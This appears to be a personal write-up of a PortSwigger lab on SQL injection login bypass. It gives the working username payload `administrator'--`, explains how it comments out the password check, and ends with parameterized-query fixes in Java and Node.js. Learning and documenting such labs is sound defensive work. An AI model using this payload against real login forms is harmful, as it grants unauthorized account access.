# Login Bypass
## Goal: 
Exploit unsanitized input in a login form's SQL WHERE clause to bypass password validation entirely. By injecting a comment sequence into the username field, the password check is eliminated from the query — granting admin access without credentials. Demonstrates how authentication itself can be dismantled through a single unsanitized field.

## Lab Details: 
Name: SQL injection vulnerability allowing login bypass

Level: Apprentice

Vulnerability Class: SQL Injection

Lab URL: [Lab link](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Date Completed: 8-May-2026

## What the Lab Is Testing
Tests whether unsanitized user input in a WHERE clause can be manipulated to bypass password validation logic.


## The Vulnerable Behavior
The login form passes the `username` field directly into a SQL WHERE clause without parameterization. The app does not sanitize or parameterize input before executing the query."


## My Approach
### Payloads tried:
| Payload   | Query | Reason| Output |
| -------- | ---------- | ---------- | ---------- |
| administrator '-- |  `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`| We had to pass a valid user (administrator) and retrieve its information without knowing the password. | Pass |


### Why It Works
```sql 
SELECT * FROM users WHERE username = 'administrator' -- ' AND password = ''
```

This bypasses the password check entirely. Instead of verifying both the `username` and `password`, the query only checks whether a user named `administrator` exists in the users table.

Since that account already exists, the database returns the `administrator`’s record and the application treats the login as successful, breaking the intended authentication logic.

## The Fix
Never use string concatenation to build SQL queries
```java
String query = "SELECT * FROM user WHERE username = ? and password = ?";
PreparedStatement stmt = conn.prepareStatement(query);
stmt.setString(1, userInputName);
stmt.setString(2, userInputPass);
```
NodeJS
```js
const mysql = require('mysql2/promise');
const [rows] = await connection.execute('SELECT * FROM users WHERE username = ? and password = ?', [username, password]);   
```

## Real-World Relevance


Some recent exploits:


## Takeaway
Use parameterized queries or prepared statements. Input sanitization alone is insufficient — attackers can bypass escape logic. Parameterization ensures user input is never interpreted as SQL syntax.